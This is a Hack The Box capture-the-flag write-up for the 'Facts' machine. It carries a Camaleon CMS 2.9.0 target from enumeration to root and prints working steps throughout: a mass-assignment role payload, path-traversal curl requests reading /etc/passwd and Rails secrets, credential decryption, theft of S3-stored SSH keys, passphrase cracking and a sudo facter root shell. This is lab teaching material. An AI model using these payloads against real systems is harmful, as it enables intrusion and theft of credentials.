# HTB Writeup — Facts

## Target Information

- **IP:** `10.129.15.57`
- **Hostname:** `facts.htb`
- **Services:** SSH (22), HTTP (80)

---

## Enumeration

### Nmap
```Bash
nmap -sC -sV -Pn 10.129.15.57
```

**Results:**
- `22/tcp` → SSH
- `80/tcp` → HTTP (nginx 1.26.3)

___

## Web Enumeration

### Virtual Host Configuration
```Bash
echo "10.129.15.57 facts.htb" | sudo tee -a /etc/hosts
```
### Technology Stack (Wappalyzer)

- Ruby on Rails
- Camaleon CMS 2.9.0
- nginx (Ubuntu)

### Directory Enumeration
```Bash
ffuf -u http://facts.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac
```

The main attack surface was identified in the `/admin` panel.

___

## Initial Access

The application allowed public user registration at:
```WebBrowser
http://facts.htb/admin/register
```

Public registration was enabled and required solving a CAPTCHA manually.

After registration, authentication via `/admin/login` provided access as a low-privileged user.

___

## Privilege Escalation (Web)

### Vulnerable Endpoint
```HTTP
POST /admin/users/5/updated_ajax
```

The vulnerable request was triggered from the **Change Password functionality** in the user profile page.

### CVE Reference

**CVE-2025-2304 — Camaleon CMS 2.9.0 Privilege Escalation**

This vulnerability affects Camaleon CMS 2.9.0 and allows privilege escalation via improper handling of user-controlled parameters in AJAX update requests.

### Description

The application accepted nested parameters under `password[...]` without enforcing restrictions on allowed attributes, leading to a mass assignment condition.

### Exploit

By intercepting the request (e.g. via Burp Suite) and modifying it as follows:
```HTTP
password[password]=test123
password[password_confirmation]=test123
password[role]=admin
```
### Impact
An attacker can escalate privileges from a low-privileged user to administrator.

### Root Cause
- Improper input validation
- Mass assignment vulnerability (CWE-915)

___

## Arbitrary File Read

### Vulnerable Endpoint
```Endpoint
/admin/media/download_private_file?file=
```
### Description

The endpoint was vulnerable to path traversal when the application was configured to use the AWS S3 uploader backend.

### CVE Reference

**CVE-2026-1776 — Authenticated arbitrary file read in Camaleon CMS AWS S3 uploader**

This vulnerability affects Camaleon CMS versions 2.4.5.0 through 2.9.0. It allows authenticated users to read arbitrary files from the server due to missing path validation in the AWS uploader implementation.

The issue arises because the `download_private_file` functionality does not validate file paths using `valid_folder_path?`, allowing directory traversal sequences.

This represents a bypass of the incomplete fix for CVE-2024-46987.

### Exploitation
```Bash
curl "http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd"
```

**Note:**  
Absolute paths (e.g. `/etc/passwd`) were not accepted. The vulnerability required **relative path traversal sequences**.

### Useful Technique

The following paths were used to locate the Rails application root:
```Bash
../../../../../../proc/self/cwd/config/database.yml
../../../../../../proc/self/cwd/Gemfile
```

___

## Sensitive File Extraction

The following files were retrieved and proved critical:

- `/etc/passwd`
- `config/database.yml`
- `config/storage.yml`
- `config/deploy.yml`
- `config/master.key`
- `config/credentials.yml.enc`
- `Gemfile`
- `storage/production.sqlite3`

The `database.yml` file confirmed the use of a local SQLite database:

```Bash
storage/production.sqlite3
```

___

## Database Analysis

```Bash
sqlite3 production.sqlite3
```

```SQL
pragma table_info(cama_users);
select * from cama_users;
```

The database contained the `cama_users` table with:
- usernames
- roles
- emails
- password hashes
- authentication tokens

The database was a key element for understanding application structure and validating privilege escalation.

___

## Credential Decryption

```Bash
gem install activesupport -v 8.0.2.1
```

```Bash
cat > decrypt_creds.rb << 'EOF'
require "active_support"
require "active_support/encrypted_file"

puts ActiveSupport::EncryptedFile.new(
  content_path: "credentials.yml.enc",
  key_path: "master.key",
  env_key: "RAILS_MASTER_KEY",
  raise_if_missing_key: true
).read
EOF
```

```Bash
ruby decrypt_creds.rb
```

Decryption of Rails credentials confirmed access to application secrets.

---

## S3 Object Storage Access

The AWS credentials were discovered in the CMS admin panel under:
```WebSite
Admin → Settings → General Site
```

The application referenced the endpoint:
```Endpoint
http://localhost:54321
```

However, from the attacker machine the correct endpoint was:
```Endpoint
http://facts.htb:54321
```

___
### AWS CLI Configuration

```Bash
aws configure --profile facts
```

### Bucket Enumeration
```Bash
aws s3 ls --endpoint-url http://facts.htb:54321 --profile facts
```

### Internal Bucket Enumeration
```Bash
aws s3 ls s3://internal --recursive --endpoint-url http://facts.htb:54321 --profile facts
```

While the `randomfacts` bucket contained public media, the `internal` bucket exposed sensitive data, including:

- `.ssh/id_ed25519`
- `.ssh/authorized_keys`

___

## SSH Access

### Download SSH Keys
```Bash
mkdir -p loot_ssh
aws s3 sync s3://internal/.ssh ./loot_ssh --endpoint-url http://facts.htb:54321 --profile facts
```

### Crack Passphrase
```Bash
ssh2john loot_ssh/id_ed25519 > id_ed25519.hash  
john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519.hash
```

Recovered passphrase:
```Bash
dragonballz
```

### SSH Login
```Bash
chmod 600 loot_ssh/id_ed25519  
ssh -i loot_ssh/id_ed25519 trivia@facts.htb
```
---

## Privilege Escalation (System)

### Sudo Privileges
```Bash
sudo -l
(ALL) NOPASSWD: /usr/bin/facter
```

___
### Exploitation of `facter`

A custom Ruby fact was used to execute arbitrary code:
```Bash
mkdir -p /tmp/facts  
cat > /tmp/facts/pwn.rb << 'EOF'  
Facter.add(:pwn) do  
  setcode do  
    exec("/bin/bash", "-p")  
  end  
end  
EOF
```

```Bash
sudo /usr/bin/facter --custom-dir /tmp/facts pwn
```

This resulted in a root shell.

---

## Attack Chain Summary

1. Identified Camaleon CMS through enumeration
2. Registered a low-privileged user (CAPTCHA-protected)
3. Exploited mass assignment (CVE-2025-2304)
4. Escalated privileges to administrator
5. Exploited arbitrary file read (CVE-2026-1776)
6. Extracted sensitive configuration and database files
7. Analyzed SQLite database (`cama_users`)
8. Retrieved and decrypted Rails credentials
9. Extracted AWS credentials from CMS settings
10. Accessed internal S3 bucket (`internal`)
11. Retrieved and cracked SSH private key
12. Obtained SSH access as `trivia`
13. Abused misconfigured sudo (`facter`) to gain root
